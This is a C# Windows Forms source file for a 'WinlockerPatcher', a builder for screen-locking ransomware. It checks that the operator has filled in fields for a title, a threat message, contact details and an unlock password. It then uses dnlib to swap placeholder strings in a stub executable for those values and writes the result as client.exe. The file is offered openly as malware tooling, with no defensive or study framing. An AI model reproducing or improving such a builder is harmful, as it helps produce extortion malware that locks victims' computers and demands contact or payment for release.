using System;
using System.IO;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
namespace WinlockerPatcher
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private bool ValidateRequired(Control control, string fieldName)
        {
            string value = null;

            switch (control)
            {
                case TextBox tb:
                    value = tb.Text;
                    break;

                case RichTextBox rtb:
                    value = rtb.Text;
                    break;

                case ComboBox cb:
                    value = cb.Text;
                    break;
            }

            if (string.IsNullOrWhiteSpace(value))
            {
                MessageBox.Show(
                    $"Field «{fieldName}» is not filled in",
                    "Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );

                control.Focus();

                if (control is ComboBox combo)
                    combo.DroppedDown = true;

                return false;
            }

            return true;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (!File.Exists("stub/stub.exe"))
            {
                MessageBox.Show("Error: stub.exe not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (!ValidateRequired(textBoxTitle, "title")) return;
            if (!ValidateRequired(richTextBoxCaption, "threat")) return;
            if (!ValidateRequired(textBoxContactText, "contactText")) return;
            if (!ValidateRequired(textBoxContact, "contact")) return;
            if (!ValidateRequired(textBoxPasswordEnterCaption, "passwordText")) return;
            if (!ValidateRequired(textBoxPassword, "password")) return;
            if (!ValidateRequired(comboBoxColor, "color")) return;
            string title = textBoxTitle.Text;
            string threat = richTextBoxCaption.Text;
            string contactText = textBoxContactText.Text;
            string contact = textBoxContact.Text;
            string passwordText = textBoxPasswordEnterCaption.Text;
            string password = textBoxPassword.Text;
            string color = comboBoxColor.Text;

            try
            {
                byte[] stubBytes = Properties.Resources.stub;

                var module = ModuleDefMD.Load(stubBytes);
                foreach (var type in module.GetTypes())
                    foreach (var method in type.Methods)
                    {
                        if (!method.HasBody) continue;

                        foreach (var instr in method.Body.Instructions)
                        {
                            if (instr.OpCode != OpCodes.Ldstr) continue;

                            string s = instr.Operand as string;
                            if (s == null) continue;

                            if (s == "TITLE_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = title;
                            else if (s == "THREAT_TEXT_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = threat;
                            else if (s == "CONTACT_TEXT_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = contactText;
                            else if (s == "CONTACT_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = contact;
                            else if (s == "COLOR_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = color;
                            else if (s == "PASSWORD_ENTER_TEXT_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = passwordText;
                            else if (s == "PASSWORD_PLACEHOLDER_123456789012345678901234567890")
                                instr.Operand = password;
                        }
                    }

                module.Write("client.exe");
                MessageBox.Show("Client.exe created", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    "Error while creating client:\n" + ex.Message,
                    "Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Form2 form2 = new Form2();
            form2.Show();
        }
    }
}
